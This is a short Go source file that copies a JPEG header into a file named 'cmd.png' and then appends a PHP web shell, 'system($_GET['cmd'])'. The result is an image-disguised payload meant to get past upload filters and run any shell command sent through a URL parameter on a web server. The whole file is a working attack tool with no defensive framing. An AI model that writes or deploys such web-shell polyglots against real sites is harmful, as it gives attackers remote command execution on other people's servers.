package main

import (
	"os"
)

func main() {
	const content = "<?php echo system($_GET['cmd']); ?>"

	fimg, err := os.Open("logo.jpeg")
	check(err)
	header := make([]byte, 55)
	n, err := fimg.Read(header)
	check(err)

	f, err := os.Create("cmd.png")
	check(err)

	// fmt.Print(hex.Dump(header))
	_, err = f.Write(header[:n])
	check(err)
	_, err = f.Write([]byte(content))
	check(err)
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}
